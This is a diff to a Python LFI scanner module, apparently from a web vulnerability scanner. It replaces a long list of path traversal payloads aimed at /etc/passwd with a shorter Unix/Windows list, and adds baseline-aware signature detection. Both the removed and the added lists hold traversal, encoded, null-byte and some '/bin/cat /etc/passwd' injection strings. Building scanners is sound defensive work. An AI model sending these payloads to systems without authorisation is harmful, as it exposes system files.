@@ -1,101 +1,77 @@
+"""Baseline-aware Unix and Windows file inclusion checks."""
+
+import re
+
 from requests import get
-from requests import packages
-from requests.exceptions import ConnectionError, RequestException
-from modules.web.query import probe_url
+from requests.exceptions import RequestException
+
+from modules.web.findings import emit, finding
+from modules.web.http import scoped_get
+from modules.web.query import parameter_indexes, probe_url, query_parts
 
 
-packages.urllib3.disable_warnings()
+def file_signatures(text):
+    signatures = set()
+    if re.search(r"(?:^|[\r\n>])root:[^:\r\n]*:0:0:[^:\r\n]*:[^:\r\n]+:[^<\r\n]+", text):
+        signatures.add("Unix passwd entry")
+    sections = re.findall(r"^\[(fonts|extensions|mci extensions|files)\]\s*$", text, re.I | re.M)
+    if len(set(section.lower() for section in sections)) >= 2:
+        signatures.add("Windows win.ini sections")
+    return signatures
+
 
 class LFIScanner:
     def __init__(self, log, console) -> None:
         self.log = log
         self.console = console
-        self.tested_urls = []
+        self.tested_urls = set()
+        self.findings = []
         self.lfi_tests = [
-            r"../../../../../etc/passwd",
-            r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2"
-            + r"e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-            r"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
-            r"\\&apos;/bin/cat%20/etc/passwd\\&apos;",
-            r"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-            r"/..%c0%af../..%c0%af../..%c0%af../..%c0"
-            + r"%af../..%c0%af../..%c0%af../etc/passwd",
-            r"/etc/default/passwd",
-            r"/./././././././././././etc/passwd",
-            r"/../../../../../../../../../../etc/passwd",
-            r"/../../../../../../../../../../etc/passwd^^",
-            r"/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd",
-            r"/etc/passwd",
-            r"%0a/bin/cat%20/etc/passwd",
-            r"%00../../../../../../etc/passwd",
-            r"%00/etc/passwd%00",
-            r"../../../../../../../../../../../../"
-            + r"../../../../../../../../../../etc/passwd",
-            r"../../etc/passwd",
-            r"../etc/passwd",
-            r".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
-            r"etc/passwd",
-            r"/etc/passwd%00",
-            r"../../../../../../../../../../../../../"
-            + r"../../../../../../../../../etc/passwd%00",
-            r"../../etc/passwd%00",
-            r"../etc/passwd%00",
-            r"/../../../../../../../../../../../etc/passwd%00.html",
-            r"/../../../../../../../../../../../etc/passwd%00.jpg",
-            r"/../../../../../../../../../../../etc/passwd%00.php",
-            r"/../../../../../../../../../../../etc/passwd%00.txt",
-            r"../../../../../../etc/passwd&=%3C%3C%3C%3C",
-            r"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/"
-            + r"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/"
-            + r"....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd",
-            r"....\\/....\\/etc/passwd",
-            r"....\\/etc/passwd",
-            r"....//....//....//....//....//....//....//....//"
-            + r"....//....//....//....//....//....//....//"
-            + r"....//....//....//....//....//....//....//etc/passwd",
-            r"....//....//etc/passwd",
-            r"....//etc/passwd",
-            r"/etc/security/passwd",
-            r"///////../../../etc/passwd",
-            r"..2fetc2fpasswd",
-            r"..2fetc2fpasswd%00",
-            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
-            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
-            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
-            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
+            "../../../../../../etc/passwd", "/etc/passwd",
+            "..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd",
+            "..%252f..%252f..%252f..%252f..%252fetc/passwd",
+            "....//....//....//....//etc/passwd",
+            "../../../../../../etc/passwd%00",
+            "../../../../../../windows/win.ini",
+            r"..\..\..\..\..\..\windows\win.ini",
+            "C:/Windows/win.ini",
         ]
 
-    def exploit_lfi(self, base_url, url_params) -> None:
-        for index, param in enumerate(url_params):
-            param_no_value = param.split("=", 1)[0]
-            main_url = f"{base_url}?{param_no_value}"
-            if main_url in self.tested_urls:
-                continue
-            self.tested_urls.append(main_url)
-            for test in self.lfi_tests:
-                test_url = probe_url(base_url, url_params, index, test)
-
+    def exploit_lfi(self, base_url, url_params):
+        original = f"{base_url}?{'&'.join(url_params)}"
+        indexes = [index for index in parameter_indexes(url_params) if (original, index) not in self.tested_urls]
+        if not indexes:
+            return []
+        try:
+            baseline = file_signatures(scoped_get(get, original).text)
+        except RequestException:
+            self.log.logger("error", f"Connection error raised on: {original}, skipping")
+            return []
+        found = []
+        for index in indexes:
+            self.tested_urls.add((original, index))
+            for payload in self.lfi_tests:
+                test_url = probe_url(base_url, url_params, index, payload)
                 try:
-                    response = get(test_url, verify=False, timeout=10)
+                    new_signatures = file_signatures(scoped_get(get, test_url).text) - baseline
+                    if not new_signatures:
+                        continue
+                    repeated = file_signatures(scoped_get(get, test_url).text) - baseline
                 except RequestException:
-                    self.log.logger(
-                        "error", f"Connection error raised on: {test_url}, skipping"
-                    )
+                    self.log.logger("error", f"Connection error raised on: {test_url}, skipping")
                     break
-                else:
-                    if response.text.find("root:x:0:0:root:/root") != -1:
-                        self.console.print(
-                            f"[red][[/red][green]+[/green][red]][/red]"
-                            + f" [white]LFI :[/white] {test_url}"
-                        )
-                        break
+                evidence = new_signatures & repeated
+                if evidence:
+                    result = finding("LFI", test_url, "Repeatable file content absent from the baseline: " + ", ".join(sorted(evidence)),
+                                     parameter=url_params[index].split("=", 1)[0], severity="high",
+                                     reproduction={"strategy": "file_inclusion", "requests": [
+                                         {"url": original, "role": "baseline"}, {"url": test_url, "role": "probe"}, {"url": test_url, "role": "repeat"}]})
+                    found.append(result)
+                    emit(self.console, result)
+                    break
+        self.findings.extend(found)
+        return found
 
-    def test_lfi(self, url) -> None:
-        """
-        Test for LFI
-        """
-        base_url, separator, params = url.partition("?")
-        if not separator or not params:
-            return
-        params_dict = params.split("&")
-        self.exploit_lfi(base_url, params_dict)
+    def test_lfi(self, url):
+        base_url, params = query_parts(url)
+        return self.exploit_lfi(base_url, params) if params else []
